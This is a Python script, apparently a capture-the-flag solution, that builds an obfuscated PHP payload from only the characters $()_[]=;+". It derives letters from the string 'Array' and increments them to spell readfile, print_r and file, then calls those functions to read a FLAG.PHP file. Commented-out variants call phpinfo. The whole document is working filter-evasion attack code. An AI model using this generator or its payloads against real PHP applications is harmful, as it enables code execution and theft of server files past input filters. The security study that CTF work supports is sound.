TMP      = "$_"
IDX      = "$__"
LOWER_A  = "$___"
UPPER_A  = "$____"
PRINTF   = "$_____"
FILE     = "$______"
FLAG     = "$_______"
PHP      = "$________"
LOWER_R  = "$_________"
PRINT    = "$__________"
PRINT_R  = "$___________"


def get_uppercase_a(var_name: str) -> str:
    parts = [f'{IDX} = "";', f'{var_name} = ([]."")[{IDX}];']
    return '\n'.join(parts)


def get_lowercase_a(var_name: str) -> str:
    parts = [f'{IDX} = "";']
    parts.extend([f'{IDX}++;'] * 3)
    parts.append(f'{var_name} = ([]."")[{IDX}];')
    return '\n'.join(parts)


def get_lowercase_r(var_name: str) -> str:
    parts = [f'{IDX} = "";', f'{IDX}++;', f'{var_name} = ([]."")[{IDX}];']
    return '\n'.join(parts)


def get_str(s: str, var_name: str) -> str:
    assert s.islower() or s.isupper(), s

    parts = [f'{var_name} = "{"_" * len(s)}";', f'{IDX} = "";']
    for c in s:
        val = 'a' if s.islower() else 'A'
        parts.append(f'{TMP} = {LOWER_A if s.islower() else UPPER_A};')
        while val != c:
            val = chr(ord(val) + 1)
            parts.append(f'{TMP}++;')
        parts.append(f'{var_name}[{IDX}] = {TMP};')
        parts.append(f'{IDX}++;')

    return '\n'.join(parts)


payload = f"""
{get_uppercase_a(UPPER_A)}
{get_lowercase_a(LOWER_A)}
{get_str("printf", PRINTF)}
{get_str("file", FILE)}
{get_str("FLAG", FLAG)}
{get_str("PHP", PHP)}
{get_str("print", PRINT)}
{get_lowercase_r(LOWER_R)}
{PRINT_R} = {PRINT}."_".{LOWER_R};
{PRINT_R}({FILE}({FLAG}.".".{PHP}));
"""
# payload = f"""
# {get_uppercase_a(UPPER_A)}
# {get_lowercase_a(LOWER_A)}
# {get_str("phpinfo", "$______")}
# $______();
# """
# payload = f"""
# {get_uppercase_a(UPPER_A)}
# {get_lowercase_a(LOWER_A)}
# $_____________________ = [""];
# {get_str("print", PRINT)}
# {get_lowercase_r(LOWER_R)}
# {PRINT_R} = {PRINT}."_".{LOWER_R};
# {PRINT_R}($_____________________);
# """
# payload = f"""
# {get_uppercase_a(UPPER_A)}
# {get_lowercase_a(LOWER_A)}
# {get_str("printf", PRINTF)}
# {get_str("file", FILE)}
# {get_str("FLAG", FLAG)}
# {get_str("PHP", PHP)}
# {PRINTF}([]);
# """
payload = f"""
{get_uppercase_a(UPPER_A)}
{get_lowercase_a(LOWER_A)}
{get_str("print", PRINT)}
{get_str("readfile", FILE)}
{get_str("FLAG", FLAG)}
{get_str("PHP", PHP)}
{get_lowercase_r(LOWER_R)}
{PRINT_R} = {PRINT}."_".{LOWER_R};
{FILE}({FLAG}.".".{PHP});
"""

print("<?php" + payload + "?>")
payload = payload.replace(' ', '').replace('\n', '')
print(payload)
print(len(payload))

assert set('$()_[]=;+".') >= set(payload)
